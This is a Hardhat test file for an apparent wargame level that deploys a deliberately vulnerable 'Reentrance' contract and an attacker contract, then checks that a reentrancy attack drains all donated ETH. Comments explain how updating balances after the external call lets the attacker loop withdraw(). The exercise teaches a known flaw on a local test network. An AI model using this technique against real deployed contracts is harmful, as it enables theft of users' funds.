import {loadFixture} from "@nomicfoundation/hardhat-toolbox/network-helpers"
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Level 10 - Reentrancy contract hack", () => {
    async function setUp() {
        const [owner, hacker, Alice, Bob] = await ethers.getSigners();

        const ReentrancyContract = await ethers.getContractFactory("Reentrance");
        const ReentrancyHackerContract = await ethers.getContractFactory("ReentrancyHack");
        
        const reentrancy = await ReentrancyContract.deploy();
        const reentrancyHacker = await ReentrancyHackerContract.deploy(await reentrancy.getAddress());

        return {owner, hacker, Alice, Bob, reentrancy, reentrancyHacker};
    };

    describe("When donating ETH", () => {
        it("Donations should add up to the contract's balance", async() => {
            const {owner, hacker, Alice, Bob, reentrancy, reentrancyHacker} = await loadFixture(setUp);
            
            expect(await ethers.provider.getBalance(await reentrancy.getAddress())).to.equal(0);
            
            await reentrancy.connect(owner).donate(Alice.address, {value: ethers.parseEther("1")});
            await reentrancy.connect(owner).donate(Bob.address, {value: ethers.parseEther("1.5")});

            expect(await ethers.provider.getBalance(await reentrancy.getAddress())).to.equal(ethers.parseEther("2.5"));
        });
    });
    
    describe("When hacking", () => {
        it("Call to the withdraw() method should remove full ETH balance", async() => {
            /*
             * Lack of the checks-effects-interaction pattern implementation is a source of Reentrancy hacks in smart contracts.
             * The Reentrancy contract withdraw() method allows any caller to take some ETH balance from it, 
             * given that it does not exceed the corresponding amount registered at the balances mapping.
             * 
             * However, the ETH transfer through the low-level call() method internally triggers the receive() method at the ReentrancyHack contract.
             * Given that Reentrancy updates the caller claimable balance AFTER executing the call() method,
             * its fallback function is able to loop over withdraw() until all funds are drained.   
            **/
            const {owner, hacker, Alice, Bob, reentrancy, reentrancyHacker} = await loadFixture(setUp);

            // We simulate two donations to add some balance to the reentrancy contract.
            await reentrancy.connect(owner).donate(Alice.address, {value: ethers.parseEther("1")});
            await reentrancy.connect(owner).donate(Bob.address, {value: ethers.parseEther("1.5")});
            expect(await ethers.provider.getBalance(await reentrancy.getAddress())).to.equal(ethers.parseEther("2.5"));

            // We check the hack output.
            await reentrancy.connect(hacker).donate(await reentrancyHacker.getAddress(), {value: ethers.parseEther("0.20")});
            await reentrancyHacker.connect(hacker).withdrawAndHack(ethers.parseEther("0.20"));
            expect(await ethers.provider.getBalance(await reentrancy.getAddress())).to.equal("0");
        });
    });
});